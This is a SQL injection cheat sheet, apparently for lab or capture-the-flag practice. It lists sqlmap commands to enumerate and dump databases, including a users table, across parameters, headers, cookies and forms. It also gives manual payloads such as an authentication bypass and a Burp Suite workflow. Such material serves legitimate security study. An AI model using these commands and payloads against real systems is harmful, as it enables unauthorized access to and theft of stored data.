06 — SQL injection


URL="http://$IP/?id=1"

sqlmap -u "$URL" --batch --dbs # Databases
sqlmap -u "$URL" -D $DB --tables --batch # Tables
sqlmap -u "$URL" -D $DB -T $TBL --columns --batch # Columns
sqlmap -u "$URL" -D $DB -T $TBL --dump --batch # Dump table / column
sqlmap -u "$URL" -D $DB -T $TBL -C flag --dump --batch

sqlmap -u "$URL" --sql-query="SELECT * FROM users" # Custom SQL query

SQLmap — options


--batch             # No interactive prompts
--dbms=MySQL        # Force DBMS
--level=5           # Detection depth (1-5)
--risk=3            # Risk level (1-3)
--flush-session     # Clear cached results
--current-db        # Current database
--technique=BEUSTQ  # Injection techniques
--technique=U       # UNION
--technique=B       # Boolean-based blind
--technique=T       # Time-based blind
--technique=E       # Error-based
--technique=S       # Stacked queries
--union-cols=1-10   # Test UNION column count
-r request.txt      # Import Burp request
-p id               # Test specific parameter
-v 3                # Verbosity

Injection points


sqlmap -u "http://$IP/page?id=1" --batch --dbs # GET parameter
sqlmap -u "http://$IP/page" --headers="X-Forwarded-For: 1*" --batch --dbs # HTTP header
sqlmap -u "$URL" --cookie="PHPSESSID=abc" --batch --dbs # Cookie / authenticated session
sqlmap -r request.txt --batch --dbs # POST / Burp request
sqlmap -u "http://$IP" --forms --crawl=3 --batch --dbs # Forms / automatic discovery

# JSON parameter
sqlmap -u "$URL" -p username --batch --dbs

Manual SQLi


-- Authentication bypass
' OR 1=1--

-- Boolean tests
' AND 1=1--
' AND 1=2--

-- UNION structure
' UNION SELECT NULL,NULL,NULL--

Injection techniques


  • Boolean-based blind: extracts data through true/false response differences.
  • Time-based blind: extracts data through response delays.
  • UNION-based: combines query results; requires compatible column count and types.
  • Error-based: extracts information through database errors.
  • Stacked queries: executes additional SQL statements when supported.
  • Nested SQLi: one query's output becomes input to another; may require manual second-stage analysis.
  • JSON SQLi: JSON response format does not prevent SQL injection.Burp Suite
  • Proxy: intercept and inspect HTTP requests.
  • Repeater: modify and resend requests manually.
  • Intruder: automate payload testing.
  • HTTP history: review captured requests.
  • Request → Save item: save request as request.txt for SQLmap.

sqlmap -r request.txt --batch --dbs # Import captured Burp request
sqlmap -r request.txt -p id --batch # Test specific parameter
sqlmap -r request.txt -p "X-Forwarded-For" --batch # Test specific header

Workflow


  1. Identify injection point (URL, header, cookie, POST, JSON).
  2. Capture request in Burp.
  3. Test manually with Repeater.
  4. Detect SQLi with SQLmap.
  5. Identify DBMS.
  6. Enumerate databases, tables and columns.
  7. Extract and verify data.
  8. If nested SQLi, investigate the second query manually.
